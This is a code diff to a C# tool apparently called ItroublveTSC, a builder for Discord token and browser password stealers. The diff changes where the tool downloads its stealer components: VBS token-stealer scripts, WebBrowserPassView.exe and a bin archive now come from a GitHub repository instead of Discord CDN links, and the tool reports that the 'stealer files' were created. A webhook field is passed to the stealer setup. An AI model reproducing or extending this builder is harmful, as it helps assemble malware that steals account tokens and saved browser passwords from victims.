@@ -74,11 +74,11 @@ namespace ItroublveTSC
                     File.Delete(_CopyTokenStealer);
                     Stealer.Dialog(this.WebHookTxt.Text);
                     using (WebClient webClient = new WebClient())
-                        webClient.DownloadFile("https://cdn.discordapp.com/attachments/716187508051935274/731133178772848670/finalres.vbs", "output/tokenstealer.vbs");
+                        webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer.vbs", "output/tokenstealer.vbs");
                     using (WebClient webClient = new WebClient())
-                        webClient.DownloadFile("https://cdn.discordapp.com/attachments/716187508051935274/731133180966600714/finalres2.vbs", "output/tokenstealer2.vbs");
+                        webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/tokenstealer2.vbs", "output/tokenstealer2.vbs");
                     using (WebClient webClient = new WebClient())
-                        webClient.DownloadFile("https://cdn.discordapp.com/attachments/716187508051935274/731133188847435856/WebBrowserPassView.exe", "output/WebBrowserPassView.exe");
+                        webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView.exe?raw=true", "output/WebBrowserPassView.exe");
                     MessageBox.Show("Stealer files successfully created!", "ItroublveTSC");
                 }
                 catch (Exception ex)
@@ -173,7 +173,7 @@ namespace ItroublveTSC
                         string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/bin";
                         DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                         using (WebClient webClient = new WebClient())
-                            webClient.DownloadFile("https://cdn.discordapp.com/attachments/716187508051935274/731150524552052856/Desktop.zip", "bin/Token Stealer Creator.zip");
+                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/bin.zip?raw=true", "bin/Token Stealer Creator.zip");
                         ZipFile.ExtractToDirectory(_cdDir + "/Token Stealer Creator.zip", _cdDir);
                         File.Delete(_cdDir + "/Token Stealer Creator.zip");
                         MessageBox.Show("bin files has been downloaded successfully.\r\nItroublveTSC will now close, please relauch to create stealer!", "ItroublveTSC");
